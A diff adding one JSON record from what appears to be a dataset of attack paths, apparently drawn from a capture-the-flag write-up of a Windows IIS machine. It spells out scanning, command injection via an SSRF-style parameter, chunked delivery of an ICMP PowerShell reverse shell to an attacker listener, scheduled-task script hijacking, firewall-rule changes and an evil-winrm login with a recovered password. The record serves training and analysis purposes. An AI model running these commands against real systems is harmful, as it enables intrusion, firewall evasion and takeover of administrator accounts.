@@ -1,0 +1,148 @@
+{
+  "id": "ap-0012",
+  "title": "Firewall Bypass: SSRF -> Internal Port Discovery -> ICMP Reverse Shell -> PE",
+  "summary": "Exploitation of a Server-Side Request Forgery (SSRF) vulnerability to perform internal port discovery, bypassing firewall rules using an ICMP reverse shell, and achieving privilege escalation via credential reuse.",
+  "attack_path_markdown": "### Step 1\nReconnaissance (Host and Port Scanning)\n### Step 2\nWeb Enumeration and Vulnerability Identification (SSRF / RCE)\n### Step 3\nICMP Reverse Shell Weaponization and Delivery\n### Step 4\nCommand and Control and Privilege Escalation\n### Step 5\nObjective Achievement (Root Flag)",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Identifying the target operating system and mapping open ports and services.",
+      "actions": [
+        "Check host status: `ping <target_ip>` ",
+        "Run full TCP port scan (fast mode): `nmap -p- -T5 --open -sS --min-rate 5000 -v -n -Pn -oG allports <target_ip>` ",
+        "Determine OS based on TTL (Windows) ",
+        "Identify services and versions on open port 62696: `nmap -sV -sC -p 62696 -oN targeted <target_ip>` ",
+        "Web service analysis: `whatweb http://<target_ip>:62696` "
+      ],
+      "tools": ["ping", "nmap", "whatweb"],
+      "techniques": ["Active Scanning", "OS Fingerprinting", "Server Enumeration"],
+      "mitre_ids": ["T1595.001", "T1082"],
+      "indicators": ["TTL 127", "Port 62696 open", "HTTP Microsoft IIS 8.5 detected"],
+      "preconditions": "Network connectivity to the target.",
+      "expected_outcome": "Discovery of open port 62696 running IIS 8.5 .",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Identifying exploitable web endpoints and preparing a customized ICMP reverse shell payload to bypass restrictive firewalls.",
+      "actions": [
+        "Enumerate web paths: Check `robots.txt` which revealed `/backend` ",
+        "Fuzzing for web files/extensions: `ffuf -w <dictionary> -e .asp,.aspx -u http://<target_ip>:62696/FUZZ.FUZZ2` (Discovers `test.asp`) ",
+        "Internal Port Discovery via SSRF: Using the RCE parameter to check internal ports (e.g., `?i=127.0.0.1:80`) [14, 15]. (Reveals internal port 80/cmd.aspx resource) .",
+        "Downloading ICMP PowerShell script: Retrieving `Invoke-PowerShell-ICMP.ps1` from a repository ",
+        "Encoding the script for transfer (Base64/UTF-16LE): `iconv -f UTF-8 -t UTF-16LE | base64 -w 0` ",
+        "Splitting the payload into chunks: `fold -w 80 <icmp_b64_file> > <chunked_file>` "
+      ],
+      "tools": ["ffuf", "powershell (scripting/encoding)"],
+      "techniques": ["SSRF", "Data Encoding", "Protocol Tunneling (ICMP)"],
+      "mitre_ids": ["T1190", "T1071.001", "T1572"],
+      "indicators": ["Discovery of 'test.asp' resource ", "Successful ping execution via command injection ", "Prepared Base64 chunks of the ICMP shell "],
+      "preconditions": "Web application accepts file path input via a parameter and allows command execution .",
+      "expected_outcome": "ICMP shell payload prepared and chunked for remote execution .",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Transferring the Base64 payload chunks incrementally to the target machine via the command execution vulnerability.",
+      "actions": [
+        "Automated delivery of chunks: Using a Bash script (`file_loader.sh`) to loop through the Base64 chunks ",
+        "Remote command execution for transfer: `curl -g -X GET \"http://<target_ip>:62696/test.asp?i=xcmd=<command>\" --data-urlencode \"xcmd=echo <B64_CHUNK> >> C:\temp\reverse.ps1\"` [28, 29]",
+        "Verifying file integrity: Checking the existence and content of the file `C:\temp\reverse.ps1` using `type` ."
+      ],
+      "tools": ["curl", "Bash script (file_loader.sh)"],
+      "techniques": ["Remote File Transfer (via RCE)", "File Write"],
+      "mitre_ids": ["T1020", "T1059.003"],
+      "indicators": ["Successful transfer of 87 lines/chunks [29]", "File `C:\temp\reverse.ps1` exists with status code 0 "],
+      "preconditions": "Command execution is stable enough to handle multiple sequential requests.",
+      "expected_outcome": "Base64 encoded script fully delivered to `C:\temp\reverse.ps1` .",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Executing the necessary PowerShell commands to decode and run the ICMP reverse shell payload.",
+      "actions": [
+        "Setting ICMP ignore policy on target (prerequisite for script): `netsh.exe advfirewall set currentprofile settings type=icmp protocol=1 code=8 action=allow` ",
+        "Decoding Base64 payload: `powershell \"$f = Get-Content C:\temp\reverse.ps1; $d = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($f)); $d | Set-Content C:\temp\exec.ps1\"` (Decodes and saves clean script to `C:\temp\exec.ps1`) ",
+        "Setting up ICMP listener: `python3 icmpsh_m.py -t <target_ip> -p <attacker_ip>` ",
+        "Executing decoded script: `powershell C:\temp\exec.ps1` "
+      ],
+      "tools": ["powershell", "icmpsh_m.py (Python)"],
+      "techniques": ["Remote Command Execution", "Process Injection (Script execution)"],
+      "mitre_ids": ["T1059.001", "T1569.002"],
+      "indicators": ["Listener receives connection", "Command prompt (`whoami`) is available "],
+      "preconditions": "The ICMP protocol is allowed outbound through the firewall .",
+      "expected_outcome": "Interactive command shell access as a low-privileged user .",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Establishing a foothold on the target machine through the ICMP reverse shell.",
+      "actions": [
+        "Confirming current user: (Implied to be IIS App Pool user) [36]",
+        "Listing user directories: `dir C:\Users` (Identifies `Administrator` and `Decoder.Minion`) "
+      ],
+      "tools": ["cmd (via ICMP shell)"],
+      "techniques": ["Protocol Tunneling", "Account Discovery"],
+      "mitre_ids": ["T1572", "T1087"],
+      "indicators": ["Stable (albeit slow) ICMP shell connection ."],
+      "preconditions": "The ICMP payload successfully executed.",
+      "expected_outcome": "Persistent command-line access via ICMP.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Internal file discovery, finding writable files, and setting up a scheduled task exploit to reveal credentials.",
+      "actions": [
+        "Discovering privileged script directory: `dir C:\SystemScripts` ",
+        "Identifying scheduled task files: `del_log.bat` and `c.ps1` ",
+        "Checking permissions on `c.ps1`: `icacls C:\SystemScripts\c.ps1` (Shows 'Everyone: Full' access) ",
+        "Injecting script to copy files: Overwriting `c.ps1` to copy `Decoder.Minion`'s Desktop contents to the writable `C:\temp` directory ",
+        "Waiting for scheduled task execution (implicit) ",
+        "Viewing copied files in `C:\temp` (Finds `user.txt` and `backup.zip`) ",
+        "Extracting password from Alternate Data Stream (ADS): `type C:\temp\backup.zip:pass` (Reveals a password hash/MD5 component) "
+      ],
+      "tools": ["dir", "icacls", "type", "PowerShell (script modification)"],
+      "techniques": ["File and Directory Discovery", "Access Token Manipulation", "Exploitation of Privilege Misconfigurations", "Alternate Data Streams (ADS)"],
+      "mitre_ids": ["T1083", "T1546.008", "T1564.004"],
+      "indicators": ["Password '1234test' recovered from ADS ."],
+      "preconditions": "The system runs a scheduled task that executes a script with 'Full' permissions for the current user .",
+      "expected_outcome": "Administrator password recovered .",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Authenticating as Administrator, modifying firewall rules for a stable shell, and executing the final payload to retrieve the root flag.",
+      "actions": [
+        "Validating Administrator credentials using PowerShell: (Implied use of `PSCredential` and `Invoke-Command`) . Successful authentication check confirms credentials [50].",
+        "Creating new inbound firewall rule: `New-NetFirewallRule -DisplayName \"Savitar\" -Direction Inbound -Action Allow -RemoteAddress <attacker_ip>` ",
+        "Establishing stable high-privileged shell (WinRM): `evil-winrm -i <target_ip> -u Administrator -p 1234test` ",
+        "Navigating to Administrator Desktop ",
+        "Executing final binary: `.\root.exe` "
+      ],
+      "tools": ["powershell (New-NetFirewallRule)", "evil-winrm", "cmd"],
+      "techniques": ["Privilege Escalation (Credential Reuse)", "Defense Evasion (Firewall Modification)", "Remote Services (WinRM)", "Execution"],
+      "mitre_ids": ["T1548.002", "T1562.004", "T1021.006"],
+      "indicators": ["Successful connection via WinRM as Administrator [54]", "Retrieval of the root flag [56]."],
+      "preconditions": "Administrator credentials found and firewall rules modified .",
+      "expected_outcome": "Full control over the machine and capture of the root flag .",
+      "confidence": 1.0
+    }
+  ],
+  "tactics": ["Initial Access", "Discovery", "Command and Control", "Privilege Escalation", "Defense Evasion"],
+  "techniques": ["ICMP Reverse Shell", "Server-Side Request Forgery", "Alternate Data Streams", "Credential Reuse"],
+  "mitre_ids": ["T1572", "T1190", "T1564.004", "T1087"],
+  "hosts": ["10.10.10.57", "10.10.14.29"],
+  "privs_obtained": ["IIS App Pool User", "Administrator"],
+  "confidence": 1.0,
+  "source_file": "",
+  "notes": "Attack path focused on firewall bypass (ICMP) and scheduled task exploitation leading to Administrator credentials. Machine is Windows (IIS 8.5).",
+  "labels": ["attack_path", "icmp_shell", "windows", "firewall_bypass", "ssrf"]
+}
+
